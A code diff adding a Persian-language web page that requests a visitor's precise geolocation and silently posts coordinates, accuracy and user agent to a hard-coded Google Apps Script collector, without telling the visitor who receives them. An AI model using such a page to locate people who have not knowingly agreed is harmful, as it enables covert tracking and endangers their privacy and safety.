@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>مکان‌یابی زنده</title>
+</head>
+<body>
+  <h2>در حال دریافت مکان...</h2>
+  <p id="status">لطفاً اجازه دسترسی به مکان را بدهید.</p>
+
+  <script>
+    const endpoint = "https://script.google.com/macros/s/AKfycbxs1-UXAc_SdpeBHAF4-ZjaPNauDb2adLGQ_rHpqKbjVcAW07sENxLW2d5_2p-IdyOuPg/exec";
+
+    function sendLocation(position) {
+      const data = {
+        lat: position.coords.latitude,
+        lng: position.coords.longitude,
+        accuracy: position.coords.accuracy,
+        ua: navigator.userAgent
+      };
+
+      fetch(endpoint, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.text())
+      .then(result => {
+        document.getElementById("status").innerText = "اطلاعات ارسال شد.";
+        console.log("Success:", result);
+      })
+      .catch(error => {
+        document.getElementById("status").innerText = "خطا در ارسال: " + error;
+        console.error("Error:", error);
+      });
+    }
+
+    function handleError(error) {
+      document.getElementById("status").innerText = "خطا در دریافت مکان: " + error.message;
+    }
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      });
+    } else {
+      document.getElementById("status").innerText = "مرورگر شما از مکان‌یابی پشتیبانی نمی‌کند.";
+    }
+  </script>
+</body>
+</html>
